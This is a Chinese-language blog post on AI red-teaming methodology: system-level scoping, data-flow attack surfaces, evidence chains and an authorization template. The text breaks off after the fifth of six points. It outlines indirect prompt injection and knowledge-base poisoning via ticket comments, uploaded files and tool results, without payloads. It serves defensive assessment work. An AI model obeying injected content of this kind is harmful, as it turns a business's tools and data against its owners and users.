@@ -1,0 +1,683 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>AI 红队不是传统渗透：安全人必须先重建的 6 个认知 | Cr4at0r's Blog</title><meta name="author" content="Cr4at0r"><meta name="copyright" content="Cr4at0r"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="最近学了一段时间的AI安全，我觉得传统红队经验能迁移到 AI 安全，但不能原样照搬。可以继续用侦察、攻击面枚举、权限提升、横向移动、证据链和报告表达这些思维方式，可是目标系统已经变了。 AI 红队不是「拿一堆越狱提示词去问模型」。那是测试里的一个片段，不是红队。真正的 AI 红队要回答的是：一个企业把模型、数据、工具、身份和业务流程接在一起之后，攻击者能不能让系统做出业务不希望它做的事？ 这篇是新">
+<meta property="og:type" content="article">
+<meta property="og:title" content="AI 红队不是传统渗透：安全人必须先重建的 6 个认知">
+<meta property="og:url" content="https://cr4at0r.github.io/2026/10/13/AI%E7%BA%A2%E9%98%9F%E4%B8%8D%E6%98%AF%E4%BC%A0%E7%BB%9F%E6%B8%97%E9%80%8F-%E5%AE%89%E5%85%A8%E4%BA%BA%E5%BF%85%E9%A1%BB%E5%85%88%E9%87%8D%E5%BB%BA%E7%9A%846%E4%B8%AA%E8%AE%A4%E7%9F%A5/index.html">
+<meta property="og:site_name" content="Cr4at0r&#39;s Blog">
+<meta property="og:description" content="最近学了一段时间的AI安全，我觉得传统红队经验能迁移到 AI 安全，但不能原样照搬。可以继续用侦察、攻击面枚举、权限提升、横向移动、证据链和报告表达这些思维方式，可是目标系统已经变了。 AI 红队不是「拿一堆越狱提示词去问模型」。那是测试里的一个片段，不是红队。真正的 AI 红队要回答的是：一个企业把模型、数据、工具、身份和业务流程接在一起之后，攻击者能不能让系统做出业务不希望它做的事？ 这篇是新">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cr4at0r.github.io/img/avatar-oss.jpeg">
+<meta property="article:published_time" content="2026-10-12T16:00:00.000Z">
+<meta property="article:modified_time" content="2026-10-13T04:47:21.910Z">
+<meta property="article:author" content="Cr4at0r">
+<meta property="article:tag" content="AI安全">
+<meta property="article:tag" content="方法论">
+<meta property="article:tag" content="红队">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cr4at0r.github.io/img/avatar-oss.jpeg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "AI 红队不是传统渗透：安全人必须先重建的 6 个认知",
+  "url": "https://cr4at0r.github.io/2026/10/13/AI%E7%BA%A2%E9%98%9F%E4%B8%8D%E6%98%AF%E4%BC%A0%E7%BB%9F%E6%B8%97%E9%80%8F-%E5%AE%89%E5%85%A8%E4%BA%BA%E5%BF%85%E9%A1%BB%E5%85%88%E9%87%8D%E5%BB%BA%E7%9A%846%E4%B8%AA%E8%AE%A4%E7%9F%A5/",
+  "image": "https://cr4at0r.github.io/img/avatar-oss.jpeg",
+  "datePublished": "2026-10-12T16:00:00.000Z",
+  "dateModified": "2026-10-13T04:47:21.910Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Cr4at0r",
+      "url": "https://cr4at0r.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/avatar.png"><link rel="canonical" href="https://cr4at0r.github.io/2026/10/13/AI%E7%BA%A2%E9%98%9F%E4%B8%8D%E6%98%AF%E4%BC%A0%E7%BB%9F%E6%B8%97%E9%80%8F-%E5%AE%89%E5%85%A8%E4%BA%BA%E5%BF%85%E9%A1%BB%E5%85%88%E9%87%8D%E5%BB%BA%E7%9A%846%E4%B8%AA%E8%AE%A4%E7%9F%A5/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.7.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.3.1/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        const data = { value }
+
+        if (ttl != null) {
+          data.expiry = Date.now() + ttl * 86400000
+        }
+
+        localStorage.setItem(key, JSON.stringify(data))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return
+
+        try {
+          const data = JSON.parse(itemStr)
+
+          if (data.expiry && Date.now() > data.expiry) {
+            localStorage.removeItem(key)
+            return
+          }
+
+          return data.value
+        } catch {
+          localStorage.removeItem(key)
+        }
+      }
+    }
+
+    const scriptCache = new Map()
+    const cssCache = new Map()
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => {
+        if (scriptCache.has(url)) {
+          return scriptCache.get(url)
+        }
+
+        const promise = new Promise((resolve, reject) => {
+          const script = document.createElement('script')
+
+          script.src = url
+          script.async = true
+
+          for (const key in attr) {
+            script.setAttribute(key, attr[key])
+          }
+
+          script.onload = resolve
+          script.onerror = reject
+
+          document.head.appendChild(script)
+        })
+
+        scriptCache.set(url, promise)
+
+        return promise
+      },
+      getCSS: (url, id) => {
+        if (cssCache.has(url)) {
+          return cssCache.get(url)
+        }
+
+        const promise = new Promise((resolve, reject) => {
+          const link = document.createElement('link')
+
+          link.rel = 'stylesheet'
+          link.href = url
+
+          if (id) {
+            link.id = id
+          }
+
+          link.onload = resolve
+          link.onerror = reject
+
+          document.head.appendChild(link)
+        })
+
+        cssCache.set(url, promise)
+
+        return promise
+      },
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const metaThemeColor = document.querySelector('meta[name="theme-color"]')
+      const activateDarkMode = () => {
+        document.documentElement.dataset.theme = 'dark'
+        if (metaThemeColor !== null) {
+          metaThemeColor.setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.dataset.theme = 'light'
+        if (metaThemeColor !== null) {
+          metaThemeColor.setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'AI 红队不是传统渗透：安全人必须先重建的 6 个认知',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 8.1.2"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">15</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">20</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/categories/AI%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/"><span> AI安全研究</span></a></div><div class="menus_item"><a class="site-page" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"><span> 漏洞复现</span></a></div><div class="menus_item"><a class="site-page" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"><span> 代码审计</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/avatar-oss.jpeg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Cr4at0r's Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">AI 红队不是传统渗透：安全人必须先重建的 6 个认知</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/categories/AI%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/"><span> AI安全研究</span></a></div><div class="menus_item"><a class="site-page" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"><span> 漏洞复现</span></a></div><div class="menus_item"><a class="site-page" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"><span> 代码审计</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">AI 红队不是传统渗透：安全人必须先重建的 6 个认知</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-10-12T16:00:00.000Z" title="发表于 2026-10-13 00:00:00">2026-10-13</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-10-13T04:47:21.910Z" title="更新于 2026-10-13 12:47:21">2026-10-13</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/AI%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/">AI安全研究</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p>最近学了一段时间的AI安全，我觉得传统红队经验能迁移到 AI 安全，但不能原样照搬。可以继续用侦察、攻击面枚举、权限提升、横向移动、证据链和报告表达这些思维方式，可是目标系统已经变了。</p>
+<p>AI 红队不是「拿一堆越狱提示词去问模型」。那是测试里的一个片段，不是红队。真正的 AI 红队要回答的是：<strong>一个企业把模型、数据、工具、身份和业务流程接在一起之后，攻击者能不能让系统做出业务不希望它做的事？</strong></p>
+<p>这篇是新版 AI 红队路线的起点，我把 AI-RTA 课件里的基础概念重组成更适合国内安全从业者的版本。它不讲数学推导，也不给可直接复用的攻击命令，重点是把六个常见误解掰开：</p>
+<ol>
+<li>AI 红队测的是系统，不只是模型；</li>
+<li>攻击面不在端口列表里，而在数据流和权限图里；</li>
+<li>基础设施、数据、模型、应用四类向量要串起来看；</li>
+<li>输出不确定，证据链必须重新定义；</li>
+<li>授权范围不只是“能不能访问某个 URL”；</li>
+<li>MITRE ATLAS 和 OWASP 是沟通地图，不是照抄剧本。</li>
+</ol>
+<h2 id="一、认知一：AI-红队测的是系统，不只是模型"><a href="#一、认知一：AI-红队测的是系统，不只是模型" class="headerlink" title="一、认知一：AI 红队测的是系统，不只是模型"></a>一、认知一：AI 红队测的是系统，不只是模型</h2><p>很多人把 AI 红队理解成“测试模型会不会被越狱”。这个理解太窄了。</p>
+<p>模型当然重要，但在企业环境里，模型经常只是一个上下文处理器。它读取用户输入、检索结果、历史会话、系统规则，然后决定回答什么或调用什么。真正决定风险的是它周围的东西：</p>
+<table>
+<thead>
+<tr>
+<th>层</th>
+<th>典型对象</th>
+<th>安全问题</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>模型层</td>
+<td>商用 API、私有模型、微调模型、多模态模型</td>
+<td>是否被诱导偏离任务，是否泄露训练或上下文内容</td>
+</tr>
+<tr>
+<td>应用层</td>
+<td>Web 入口、API、系统提示词、会话、前端</td>
+<td>输入如何拼接，输出如何被展示或执行</td>
+</tr>
+<tr>
+<td>数据层</td>
+<td>文档、知识库、向量库、工单、用户反馈</td>
+<td>谁能写入，检索是否越权，来源是否可信</td>
+</tr>
+<tr>
+<td>Agent 层</td>
+<td>工具调用、记忆、MCP server、多 Agent 编排</td>
+<td>模型能调用什么，参数谁决定，结果谁审计</td>
+</tr>
+<tr>
+<td>协议&#x2F;供应链层</td>
+<td>模型网关、插件、依赖、模型文件、tokenizer</td>
+<td>来源是否可信，版本是否可追溯，更新能否回滚</td>
+</tr>
+<tr>
+<td>基础设施层</td>
+<td>云账号、K8s、Pod、ServiceAccount、Secret、网络</td>
+<td>应用身份能到哪里，出站是否可控</td>
+</tr>
+</tbody></table>
+<p>举个例子。一个「智能客服助手」看起来只有一个聊天框，但后面可能是：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">客户输入</span><br><span class="line">  → Web/API 入口</span><br><span class="line">  → 输入过滤和会话管理</span><br><span class="line">  → 模型网关</span><br><span class="line">  → RAG 检索知识库</span><br><span class="line">  → 模型生成回答</span><br><span class="line">  → Agent 判断是否查工单</span><br><span class="line">  → 工单 API</span><br><span class="line">  → 内部数据库</span><br><span class="line">  → 日志与审计</span><br></pre></td></tr></table></figure>
+
+<p>如果只测模型，你可能会问：「能不能让模型忽略规则？」但如果做系统级红队，要问的是：</p>
+<ol>
+<li>客户提交的工单评论会不会进入知识库？</li>
+<li>检索结果会不会带着路径、权限或敏感字段返回？</li>
+<li>模型能不能驱动工单查询、退款申请或内部通知？</li>
+<li>查询工具使用的是用户身份、服务身份，还是数据库管理员身份？</li>
+<li>一次异常调用能不能被还原成完整证据链？</li>
+</ol>
+<p><strong>所以呢：AI 红队的范围不是模型官网上的几个 prompt，而是模型接入业务后的所有权限和数据流。</strong></p>
+<h2 id="二、认知二：攻击面不在端口列表里，而在数据流和权限图里"><a href="#二、认知二：攻击面不在端口列表里，而在数据流和权限图里" class="headerlink" title="二、认知二：攻击面不在端口列表里，而在数据流和权限图里"></a>二、认知二：攻击面不在端口列表里，而在数据流和权限图里</h2><p>传统渗透测试仍然要做资产发现、端口探测、Web 指纹、身份认证和内网横移。这些方法没有失效，只是不够了。</p>
+<p>AI 系统的一个入口可能暴露在 443 端口，流量看起来就是干净的 HTTPS JSON。但从红队视角看，入口后面有一张完全不同的图：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">外部用户 / 内部员工 / 第三方文档</span><br><span class="line">        │</span><br><span class="line">        ▼</span><br><span class="line">应用入口与会话管理</span><br><span class="line">        │</span><br><span class="line">        ▼</span><br><span class="line">上下文组装：系统规则 + 用户输入 + RAG 结果 + 历史记忆</span><br><span class="line">        │</span><br><span class="line">        ▼</span><br><span class="line">模型网关 / 模型服务</span><br><span class="line">        │</span><br><span class="line">        ▼</span><br><span class="line">模型输出 / 工具调用建议</span><br><span class="line">        │</span><br><span class="line">        ▼</span><br><span class="line">工具层：搜索、数据库、文件、邮件、审批、云 API</span><br><span class="line">        │</span><br><span class="line">        ▼</span><br><span class="line">内部系统、数据存储、身份与日志</span><br></pre></td></tr></table></figure>
+
+<p>安全评估前至少要画清六类边界：</p>
+<table>
+<thead>
+<tr>
+<th>边界</th>
+<th>关键问题</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>用户输入边界</td>
+<td>哪些字段会进入模型？哪些会被持久化？</td>
+</tr>
+<tr>
+<td>内容来源边界</td>
+<td>知识库、网页、附件、工单评论、第三方返回值是否可信？</td>
+</tr>
+<tr>
+<td>上下文边界</td>
+<td>系统规则、用户输入、检索结果、记忆是否隔离标记？</td>
+</tr>
+<tr>
+<td>模型输出边界</td>
+<td>输出是否会进入前端、邮件、SQL、代码、审批或工具参数？</td>
+</tr>
+<tr>
+<td>工具权限边界</td>
+<td>模型能选择动作，还是只能选择预定义动作？</td>
+</tr>
+<tr>
+<td>平台身份边界</td>
+<td>应用 Pod、模型网关、工具服务各自使用什么身份？</td>
+</tr>
+</tbody></table>
+<p>我常用的判断是：<strong>不要先问“这里能不能绕过”，先问“这段内容从哪来、能到哪去、以什么身份执行”。</strong></p>
+<p>例如，一份用户上传的 PDF 表面上是资料，但如果它会被解析、切片、写入向量库，再在未来某次提问中被检索进模型上下文，它就不是普通文件，而是一个延迟进入上下文的输入源。</p>
+<p>同样，一个工具返回值表面上只是 JSON，但如果它会再次拼进模型上下文，下一轮模型可能根据它生成新的工具参数，那么这个返回值也不是普通数据。</p>
+<p><strong>所以呢：AI 安全评估要先把“不可信内容进入高权限上下文”的路径画出来，再决定测试优先级。</strong></p>
+<h2 id="三、认知三：基础设施、数据、模型、应用要串起来看"><a href="#三、认知三：基础设施、数据、模型、应用要串起来看" class="headerlink" title="三、认知三：基础设施、数据、模型、应用要串起来看"></a>三、认知三：基础设施、数据、模型、应用要串起来看</h2><p>AI-RTA 基础模块把 AI 攻击向量分成四类：基础设施、数据、模型、应用。这个分类很适合入门，但不要把它们当成四个独立桶。</p>
+<table>
+<thead>
+<tr>
+<th>向量</th>
+<th>典型对象</th>
+<th>安全要回答的问题</th>
+<th>常见控制点</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>基础设施</td>
+<td>云账号、API Key、模型服务、K8s、容器、Secret、CI&#x2F;CD</td>
+<td>谁能部署模型？谁能读取凭据？应用能访问哪里？</td>
+<td>IAM、RBAC、网络策略、密钥管理、出站控制</td>
+</tr>
+<tr>
+<td>数据</td>
+<td>训练数据、微调数据、知识库、向量库、用户上传、工单评论</td>
+<td>谁能写入？来源是否可信？敏感数据如何分级？</td>
+<td>数据来源审批、解析隔离、权限感知检索、DLP</td>
+</tr>
+<tr>
+<td>模型</td>
+<td>商用模型、私有模型、LoRA adapter、tokenizer、评估集</td>
+<td>是否被诱导、提取、投毒或后门化？版本能否回滚？</td>
+<td>模型准入、行为回归、版本签名、推理审计</td>
+</tr>
+<tr>
+<td>应用</td>
+<td>Web&#x2F;API、系统提示词、Agent、工具、MCP、多 Agent</td>
+<td>不可信输入能否影响工具？输出能否驱动业务动作？</td>
+<td>参数白名单、工具策略、人工确认、执行审计</td>
+</tr>
+</tbody></table>
+<p>这四类向量经常组合出现：</p>
+<ol>
+<li><strong>基础设施 + 数据</strong>：知识库同步服务拿到过宽云凭据，攻击者影响它读取或写入的文档范围。</li>
+<li><strong>数据 + 模型</strong>：恶意文档进入知识库，未来被检索后影响模型回答。</li>
+<li><strong>模型 + 应用</strong>：模型输出被当成工具参数，导致模型建议变成系统动作。</li>
+<li><strong>应用 + 基础设施</strong>：Agent 工具运行在过宽权限的 Pod 里，一次参数问题变成内网或云资源访问问题。</li>
+</ol>
+<p>红队计划里不要只写「测试提示注入」「测试模型提取」，要写成一条条可验证的链路：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">入口来源</span><br><span class="line">  → 进入哪个上下文</span><br><span class="line">  → 影响哪个模型决策</span><br><span class="line">  → 驱动哪个工具</span><br><span class="line">  → 使用哪个身份</span><br><span class="line">  → 到达哪个资源</span><br><span class="line">  → 留下哪些日志</span><br><span class="line">  → 造成什么业务影响</span><br></pre></td></tr></table></figure>
+
+<p><strong>所以呢：单点风险只有放进链路里，才能判断它到底是低危噪音，还是真实业务风险。</strong></p>
+<h2 id="四、认知四：输出不确定，证据链必须重新定义"><a href="#四、认知四：输出不确定，证据链必须重新定义" class="headerlink" title="四、认知四：输出不确定，证据链必须重新定义"></a>四、认知四：输出不确定，证据链必须重新定义</h2><p>传统 Web 漏洞的证据往往比较直接：某个请求返回了某个状态码、某个响应体、某段错误信息，或者某个未授权对象可以被读取。AI 系统不同，它有随机性、上下文依赖、模型版本差异和检索结果差异。</p>
+<p>同一个问题，在不同时间、不同会话、不同检索结果、不同模型版本下，可能得到不同回答。所以 AI 红队不能只截一张「模型说了不该说的话」的图就结束。</p>
+<p>更可靠的证据至少要包含：</p>
+<table>
+<thead>
+<tr>
+<th>证据维度</th>
+<th>需要记录的内容</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>环境</td>
+<td>测试环境、模型名称、模型版本、网关版本、应用版本</td>
+</tr>
+<tr>
+<td>会话</td>
+<td>会话 ID、用户角色、租户、时间、上下文轮次</td>
+</tr>
+<tr>
+<td>输入</td>
+<td>原始输入、脱敏后的输入、使用的模板或测试用例 ID</td>
+</tr>
+<tr>
+<td>检索</td>
+<td>命中的知识库来源、文档 ID、路径、权限、相似度分数</td>
+</tr>
+<tr>
+<td>工具</td>
+<td>工具名、参数、调用身份、目标资源、策略决策、返回摘要</td>
+</tr>
+<tr>
+<td>输出</td>
+<td>模型回答摘要、引用内容、是否暴露敏感字段</td>
+</tr>
+<tr>
+<td>策略</td>
+<td>是否命中过滤器、是否放行、为什么放行</td>
+</tr>
+<tr>
+<td>影响</td>
+<td>信息暴露、越权操作、错误执行、成本损失、合规风险</td>
+</tr>
+</tbody></table>
+<p>这里要特别注意三个误报：</p>
+<ol>
+<li><strong>模型复述了资料，不代表一定泄露训练数据。</strong> 要确认内容来自用户上传、公开网页、知识库还是模型参数。</li>
+<li><strong>模型输出了危险文本，不代表系统会执行。</strong> 要看输出是否进入命令、SQL、代码解释器、审批或自动化流程。</li>
+<li><strong>单次成功不代表稳定复现。</strong> 要在授权范围内确认触发条件、频率和版本依赖。</li>
+</ol>
+<p>反过来说，也不能因为模型「大部分时候拒绝」就判定安全。如果一条工单评论今天写入，下周被别人提问时触发，它就不是单次请求问题，而是持久化内容进入上下文的问题。</p>
+<p><strong>所以呢：AI 红队报告要从“截图证明”升级为“条件、版本、来源、路径、影响和复现边界都清楚”。</strong></p>
+<h2 id="五、认知五：授权不只是“能不能访问某个-URL”"><a href="#五、认知五：授权不只是“能不能访问某个-URL”" class="headerlink" title="五、认知五：授权不只是“能不能访问某个 URL”"></a>五、认知五：授权不只是“能不能访问某个 URL”</h2><p>传统红队授权书通常会写目标域名、IP、测试时间、允许的测试方式和禁止行为。AI 红队也需要这些，但还要额外回答很多问题：</p>
+<ol>
+<li>能不能使用真实客户数据？</li>
+<li>能不能上传文件？</li>
+<li>能不能写入知识库、记忆或用户配置？</li>
+<li>能不能触发真实邮件、审批、支付、通知？</li>
+<li>能不能调用第三方模型 API？费用谁承担？</li>
+<li>能不能使用公开数据集或公开模型仓库里的样例？</li>
+<li>测试产生的会话、日志和文档如何保留、脱敏和销毁？</li>
+<li>如果模型输出了个人敏感信息，报告如何存储？</li>
+</ol>
+<p>AI 红队的授权范围应该至少覆盖七个字段：</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># AI 红队授权范围模板</span></span><br><span class="line"></span><br><span class="line"><span class="section">## 1. 业务目标</span></span><br><span class="line"><span class="bullet">-</span> 被测系统：</span><br><span class="line"><span class="bullet">-</span> 业务负责人：</span><br><span class="line"><span class="bullet">-</span> 安全负责人：</span><br><span class="line"><span class="bullet">-</span> 主要风险关注点：</span><br><span class="line"></span><br><span class="line"><span class="section">## 2. 环境与版本</span></span><br><span class="line"><span class="bullet">-</span> 允许环境：</span><br><span class="line"><span class="bullet">-</span> 禁止环境：</span><br><span class="line"><span class="bullet">-</span> 模型/网关/应用版本：</span><br><span class="line"><span class="bullet">-</span> 时间窗：</span><br><span class="line"></span><br><span class="line"><span class="section">## 3. 数据边界</span></span><br><span class="line"><span class="bullet">-</span> 可使用数据：</span><br><span class="line"><span class="bullet">-</span> 脱敏要求：</span><br><span class="line"><span class="bullet">-</span> 禁止使用的数据：</span><br><span class="line"><span class="bullet">-</span> 发现敏感数据后的处理方式：</span><br><span class="line"></span><br><span class="line"><span class="section">## 4. 技术边界</span></span><br><span class="line"><span class="bullet">-</span> 允许测试：</span><br><span class="line"><span class="bullet">  -</span> 提示注入与越狱行为测试；</span><br><span class="line"><span class="bullet">  -</span> RAG 来源与权限验证；</span><br><span class="line"><span class="bullet">  -</span> 工具参数边界验证；</span><br><span class="line"><span class="bullet">  -</span> 只读内部可达性验证。</span><br><span class="line"><span class="bullet">-</span> 需单独审批：</span><br><span class="line"><span class="bullet">  -</span> 写入知识库；</span><br><span class="line"><span class="bullet">  -</span> 写入记忆；</span><br><span class="line"><span class="bullet">  -</span> 触发通知、审批或支付；</span><br><span class="line"><span class="bullet">  -</span> 批量读取或导出；</span><br><span class="line"><span class="bullet">  -</span> 调用第三方付费 API。</span><br><span class="line"><span class="bullet">-</span> 禁止行为：</span><br><span class="line"><span class="bullet">  -</span> 破坏服务；</span><br><span class="line"><span class="bullet">  -</span> 修改生产数据；</span><br><span class="line"><span class="bullet">  -</span> 建立持久化后门；</span><br><span class="line"><span class="bullet">  -</span> 使用真实客户数据做大规模验证；</span><br><span class="line"><span class="bullet">  -</span> 对第三方服务发起测试。</span><br><span class="line"></span><br><span class="line"><span class="section">## 5. 预算与频率</span></span><br><span class="line"><span class="bullet">-</span> 交互次数上限：</span><br><span class="line"><span class="bullet">-</span> 模型调用预算：</span><br><span class="line"><span class="bullet">-</span> 并发限制：</span><br><span class="line"><span class="bullet">-</span> 触发风控后的处理：</span><br><span class="line"></span><br><span class="line"><span class="section">## 6. 证据与报告</span></span><br><span class="line"><span class="bullet">-</span> 证据保存位置：</span><br><span class="line"><span class="bullet">-</span> 脱敏规则：</span><br><span class="line"><span class="bullet">-</span> 保留期限：</span><br><span class="line"><span class="bullet">-</span> 可接触人员：</span><br><span class="line"></span><br><span class="line"><span class="section">## 7. 止损与联系人</span></span><br><span class="line"><span class="bullet">-</span> 立即停止条件：</span><br><span class="line"><span class="bullet">-</span> 业务联系人：</span><br><span class="line"><span class="bullet">-</span> 安全联系人：</span><br><span class="line"><span class="bullet">-</span> 应急处置方式：</span><br></pre></td></tr></table></figure>
+
